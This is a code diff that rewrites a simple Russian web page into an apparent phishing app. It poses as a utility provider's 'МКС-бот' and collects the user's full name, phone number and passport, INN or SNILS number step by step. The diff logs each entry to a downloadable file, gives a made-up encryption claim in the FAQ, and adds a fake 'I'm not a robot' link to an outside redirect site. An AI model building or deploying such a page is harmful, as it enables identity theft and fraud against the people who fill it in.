@@ -1,101 +1,337 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>МКС Бот — WebApp</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0b0c10;
-      color: #ffffff;
-      text-align: center;
-      padding: 20px;
-    }
-    h1 {
-      color: #45a29e;
-    }
-    .btn {
-      display: block;
-      margin: 10px auto;
-      padding: 15px;
-      width: 250px;
-      background: #1f2833;
-      border: 2px solid #66fcf1;
-      border-radius: 8px;
-      color: #ffffff;
-      font-size: 18px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    .btn:hover {
-      background: #45a29e;
-    }
-    .hidden {
-      display: none;
-    }
-    textarea {
-      width: 90%;
-      height: 100px;
-      margin-top: 10px;
-      padding: 10px;
-      border-radius: 5px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>МКС-бот</title>
+    <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.production.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/babel-standalone@7.22.9/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <h1>🚀 МКС — Панель управления</h1>
-  <p>Добро пожаловать! Выберите действие:</p>
+<body class="bg-gray-100 font-sans">
+    <div id="root"></div>
+    <script type="text/babel">
+        const { useState, useReducer, useEffect } = React;
 
-  <button class="btn" onclick="showForm('reg')">✍️ Регистрация</button>
-  <button class="btn" onclick="showForm('status')">📊 Проверить статус</button>
-  <button class="btn" onclick="showForm('feedback')">💬 Оставить отзыв</button>
-  <button class="btn" onclick="showForm('help')">❓ Помощь</button>
+        // State management for form
+        const initialState = {
+            step: 'start',
+            fullname: '',
+            phone: '',
+            document_type: '',
+            document_number: '',
+        };
 
-  <!-- Регистрация -->
-  <div id="form-reg" class="hidden">
-    <h2>✍️ Регистрация</h2>
-    <input type="text" id="name" placeholder="Введите имя"><br><br>
-    <input type="text" id="email" placeholder="Введите email"><br><br>
-    <button class="btn" onclick="submitForm('reg')">✅ Отправить</button>
-  </div>
+        function reducer(state, action) {
+            switch (action.type) {
+                case 'SET_STEP':
+                    return { ...state, step: action.payload };
+                case 'SET_FULLNAME':
+                    return { ...state, fullname: action.payload };
+                case 'SET_PHONE':
+                    return { ...state, phone: action.payload };
+                case 'SET_DOCUMENT_TYPE':
+                    return { ...state, document_type: action.payload };
+                case 'SET_DOCUMENT_NUMBER':
+                    return { ...state, document_number: action.payload };
+                case 'RESET':
+                    return initialState;
+                default:
+                    return state;
+            }
+        }
 
-  <!-- Проверка статуса -->
-  <div id="form-status" class="hidden">
-    <h2>📊 Проверка статуса</h2>
-    <p>Ваш статус: <b>Активен ✅</b></p>
-  </div>
+        // Save data to localStorage and prepare for download
+        function saveAndForwardPartial(state, userId, username) {
+            const timestamp = new Date().toLocaleString('ru-RU');
+            const userWithBot = username ? `@${username} (МКС)` : '(МКС)';
+            const record = `${timestamp}\t${userId}\t${userWithBot}\t${state.fullname}\t${state.phone}\t${state.document_type} ${state.document_number}\n`;
 
-  <!-- Отзыв -->
-  <div id="form-feedback" class="hidden">
-    <h2>💬 Отзыв</h2>
-    <textarea id="feedbackText" placeholder="Напишите отзыв..."></textarea><br>
-    <button class="btn" onclick="submitForm('feedback')">📩 Отправить отзыв</button>
-  </div>
+            // Append to localStorage (simulating file write)
+            const existingData = localStorage.getItem('reg.txt') || '';
+            localStorage.setItem('reg.txt', existingData + record);
+            console.log(`Saved: ${record}`);
 
-  <!-- Помощь -->
-  <div id="form-help" class="hidden">
-    <h2>❓ Помощь</h2>
-    <p>Если возникли проблемы, обратитесь к администратору.</p>
-  </div>
+            // Create downloadable file
+            const blob = new Blob([existingData + record], { type: 'text/plain' });
+            return URL.createObjectURL(blob);
+        }
 
-  <script>
-    function showForm(form) {
-      document.querySelectorAll("div").forEach(div => div.classList.add("hidden"));
-      document.getElementById("form-" + form).classList.remove("hidden");
-    }
+        function App() {
+            const [state, dispatch] = useReducer(reducer, initialState);
+            const [inputValue, setInputValue] = useState('');
+            const [error, setError] = useState('');
+            const [downloadLink, setDownloadLink] = useState('');
 
-    function submitForm(type) {
-      if (type === "reg") {
-        let name = document.getElementById("name").value;
-        let email = document.getElementById("email").value;
-        alert("Спасибо, " + name + "! Вы зарегистрированы с email: " + email);
-      }
-      if (type === "feedback") {
-        let text = document.getElementById("feedbackText").value;
-        alert("Спасибо за отзыв: " + text);
-      }
-    }
-  </script>
+            // Simulated user info
+            const userId = '123456789';
+            const username = 'WebUser';
+
+            const handleButtonClick = (action, payload) => {
+                setError('');
+                setInputValue('');
+                switch (action) {
+                    case 'start':
+                        dispatch({ type: 'RESET' });
+                        break;
+                    case 'update_data':
+                        dispatch({ type: 'SET_STEP', payload: 'fullname' });
+                        break;
+                    case 'phone':
+                        if (!/^[А-Яа-яЁё\s-]+$/.test(inputValue)) {
+                            setError('ФИО должно содержать только буквы.');
+                            return;
+                        }
+                        dispatch({ type: 'SET_FULLNAME', payload: inputValue.trim().replace(/\s+/g, ' ') });
+                        dispatch({ type: 'SET_STEP', payload: 'phone' });
+                        setDownloadLink(saveAndForwardPartial({ ...state, fullname: inputValue.trim() }, userId, username));
+                        break;
+                    case 'document_type':
+                        if (!inputValue.startsWith('+7') && !inputValue.startsWith('7')) {
+                            setError('Номер телефона должен начинаться с +7 или 7.');
+                            return;
+                        }
+                        const digits = inputValue.replace(/[^0-9]/g, '');
+                        if (digits.length < 10 || digits.length > 11) {
+                            setError('Номер телефона должен содержать 10 или 11 цифр.');
+                            return;
+                        }
+                        dispatch({ type: 'SET_PHONE', payload: inputValue });
+                        dispatch({ type: 'SET_STEP', payload: 'document_type' });
+                        setDownloadLink(saveAndForwardPartial({ ...state, phone: inputValue }, userId, username));
+                        break;
+                    case 'document_number':
+                        dispatch({ type: 'SET_DOCUMENT_TYPE', payload: payload });
+                        dispatch({ type: 'SET_STEP', payload: 'document_number' });
+                        setDownloadLink(saveAndForwardPartial({ ...state, document_type: payload }, userId, username));
+                        break;
+                    case 'submit_document':
+                        dispatch({ type: 'SET_DOCUMENT_NUMBER', payload: inputValue });
+                        setDownloadLink(saveAndForwardPartial({ ...state, document_number: inputValue }, userId, username));
+                        dispatch({ type: 'SET_STEP', payload: 'verify' });
+                        break;
+                    case 'back':
+                        if (state.step === 'fullname') {
+                            dispatch({ type: 'RESET' });
+                        } else if (state.step === 'phone') {
+                            dispatch({ type: 'SET_STEP', payload: 'fullname' });
+                        } else if (state.step === 'document_type') {
+                            dispatch({ type: 'SET_STEP', payload: 'phone' });
+                        } else if (state.step === 'document_number') {
+                            dispatch({ type: 'SET_STEP', payload: 'document_type' });
+                        } else if (state.step === 'faq') {
+                            dispatch({ type: 'SET_STEP', payload: 'additional_services' });
+                        } else {
+                            dispatch({ type: 'RESET' });
+                        }
+                        break;
+                    case 'additional_services':
+                        dispatch({ type: 'SET_STEP', payload: 'additional_services' });
+                        break;
+                    case 'faq':
+                        dispatch({ type: 'SET_STEP', payload: 'faq' });
+                        break;
+                    case 'unauthorized':
+                        dispatch({ type: 'SET_STEP', payload: 'unauthorized' });
+                        break;
+                    default:
+                        break;
+                }
+            };
+
+            const renderButtons = () => {
+                switch (state.step) {
+                    case 'start':
+                        return (
+                            <div className="grid grid-cols-1 gap-2">
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('update_data')}>📝 Обновить данные</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('unauthorized')}>🔄 Поменять тариф</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('unauthorized')}>💳 Проверить баланс</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('unauthorized')}>💸 Пополнить баланс</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('additional_services')}>🛠️ Дополнительные услуги</button>
+                            </div>
+                        );
+                    case 'fullname':
+                        return (
+                            <div>
+                                <p className="font-bold">УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</p>
+                                <p>👤 Укажите Фамилию Имя Отчество полностью (только текст):</p>
+                                <input
+                                    type="text"
+                                    value={inputValue}
+                                    onChange={(e) => setInputValue(e.target.value)}
+                                    className="border p-2 w-full mt-2"
+                                    placeholder="ФИО"
+                                />
+                                {error && <p className="text-red-500">{error}</p>}
+                                <div className="flex gap-2 mt-2">
+                                    <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('phone')}>Далее</button>
+                                    <button className="bg-gray-500 text-white p-2 rounded" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                                </div>
+                            </div>
+                        );
+                    case 'phone':
+                        return (
+                            <div>
+                                <p className="font-bold">УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</p>
+                                <p>📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567):</p>
+                                <input
+                                    type="text"
+                                    value={inputValue}
+                                    onChange={(e) => setInputValue(e.target.value)}
+                                    className="border p-2 w-full mt-2"
+                                    placeholder="+79991234567"
+                                />
+                                {error && <p className="text-red-500">{error}</p>}
+                                <div className="flex gap-2 mt-2">
+                                    <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('document_type')}>Далее</button>
+                                    <button className="bg-gray-500 text-white p-2 rounded" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                                </div>
+                            </div>
+                        );
+                    case 'document_type':
+                        return (
+                            <div>
+                                <p>Выберите документ:</p>
+                                <div className="grid grid-cols-1 gap-2">
+                                    <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('document_number', 'Паспорт')}>📄 Паспорт</button>
+                                    <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('document_number', 'ИНН')}>🧾 ИНН</button>
+                                    <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('document_number', 'СНИЛС')}>🟢 СНИЛС</button>
+                                    <button className="bg-gray-500 text-white p-2 rounded" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                                </div>
+                            </div>
+                        );
+                    case 'document_number':
+                        return (
+                            <div>
+                                <p className="font-bold">УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</p>
+                                <p>Введите {state.document_type === 'Паспорт' ? 'серию и номер паспорта (пример: 4510 123456)' : state.document_type === 'ИНН' ? 'ИНН (пример: 500100732259)' : 'СНИЛС (пример: 112-233-445 95)'}:</p>
+                                <input
+                                    type="text"
+                                    value={inputValue}
+                                    onChange={(e) => setInputValue(e.target.value)}
+                                    className="border p-2 w-full mt-2"
+                                    placeholder={state.document_type === 'Паспорт' ? '4510 123456' : state.document_type === 'ИНН' ? '500100732259' : '112-233-445 95'}
+                                />
+                                <div className="flex gap-2 mt-2">
+                                    <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('submit_document')}>Далее</button>
+                                    <button className="bg-gray-500 text-white p-2 rounded" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                                </div>
+                            </div>
+                        );
+                    case 'verify':
+                        return (
+                            <div>
+                                <p className="font-bold">❗️Последний шаг❗️</p>
+                                <p>Для обновления данных подтвердите, что вы человек, нажав на кнопку ниже. После подтверждения вы вернетесь в главное меню!</p>
+                                <a href="https://redirect.figma.site/" target="_blank" className="bg-green-500 text-white p-2 rounded inline-block mt-2">Я не робот ✅</a>
+                                {downloadLink && (
+                                    <a href={downloadLink} download="reg.txt" className="bg-blue-500 text-white p-2 rounded inline-block mt-2 ml-2">Скачать данные</a>
+                                )}
+                            </div>
+                        );
+                    case 'additional_services':
+                        return (
+                            <div className="grid grid-cols-1 gap-2">
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('faq')}>❓ Часто задаваемые вопросы</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('instruction')}>ℹ️ Инструкция</button>
+                                <a href="https://t.me/MyMKCsup" target="_blank" className="bg-blue-500 text-white p-2 rounded">📞 Связаться с техподдержкой</a>
+                                <button className="bg-gray-500 text-white p-2 rounded" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'faq':
+                        return (
+                            <div className="grid grid-cols-1 gap-2">
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('faq_deadline')}>⏳ До какого числа нужно передавать показания?</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('faq_penalty')}>💸 Что будет, если не передать данные вовремя?</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('faq_safe')}>🔒 Это безопасно?</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('faq_telegram')}>⚡️ Почему через Telegram?</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('faq_fix')}>🔁 Можно ли исправить ошибку?</button>
+                                <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('faq_documents')}>📑 Какие документы можно использовать?</button>
+                                <button className="bg-gray-500 text-white p-2 rounded" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'faq_deadline':
+                        return (
+                            <div>
+                                <p>📌 Показания счетчиков нужно передавать до 25 числа каждого месяца.</p>
+                                <button className="bg-gray-500 text-white p-2 rounded mt-2" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'faq_penalty':
+                        return (
+                            <div>
+                                <p>⚠️ Плата будет начислена по среднему — исходя из показаний за последние полгода.</p>
+                                <button className="bg-gray-500 text-white p-2 rounded mt-2" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'faq_safe':
+                        return (
+                            <div>
+                                <p>🔒 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование).</p>
+                                <button className="bg-gray-500 text-white p-2 rounded mt-2" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'faq_telegram':
+                        return (
+                            <div>
+                                <p>⚡️ Для удобства и переход на цифровые площадки.</p>
+                                <button className="bg-gray-500 text-white p-2 rounded mt-2" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'faq_fix':
+                        return (
+                            <div>
+                                <p>✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод.</p>
+                                <button className="bg-gray-500 text-white p-2 rounded mt-2" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'faq_documents':
+                        return (
+                            <div>
+                                <p>👉 Паспорт, ИНН, СНИЛС.</p>
+                                <button className="bg-gray-500 text-white p-2 rounded mt-2" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'instruction':
+                        return (
+                            <div>
+                                <p>📋 Чтобы обновить данные:<br />
+                                    1️⃣ Нажмите «Обновить данные».<br />
+                                    2️⃣ Отправьте номер телефона.<br />
+                                    3️⃣ Выберите документ и введите его номер.<br />
+                                    4️⃣ Получите подтверждение.<br /><br />
+                                    На любом этапе вы можете нажать '↩️ Вернуться назад'.
+                                </p>
+                                <button className="bg-gray-500 text-white p-2 rounded mt-2" onClick={() => handleButtonClick('back')}>↩️ Вернуться назад</button>
+                            </div>
+                        );
+                    case 'unauthorized':
+                        return (
+                            <div>
+                                <p>Мы не можем выполнить действие, так как вы не авторизовались.</p>
+                                <div className="grid grid-cols-1 gap-2">
+                                    <button className="bg-blue-500 text-white p-2 rounded" onClick={() => handleButtonClick('update_data')}>🔐 Авторизоваться</button>
+                                    <button className="bg-gray-500 text-white p-2 rounded" onClick={() => handleButtonClick('back')}>↩️ Сменить действие</button>
+                                </div>
+                            </div>
+                        );
+                    default:
+                        return null;
+                }
+            };
+
+            return (
+                <div className="max-w-md mx-auto p-4 bg-white rounded-lg shadow-md mt-4">
+                    <h1 className="text-2xl font-bold text-center mb-4">🏠 МКС-бот 📡</h1>
+                    {state.step === 'start' && <p className="text-center mb-4">Управляйте своими услугами легко и быстро! 🌐</p>}
+                    {renderButtons()}
+                </div>
+            );
+        }
+
+        ReactDOM.render(<App />, document.getElementById('root'));
+    </script>
 </body>
 </html>
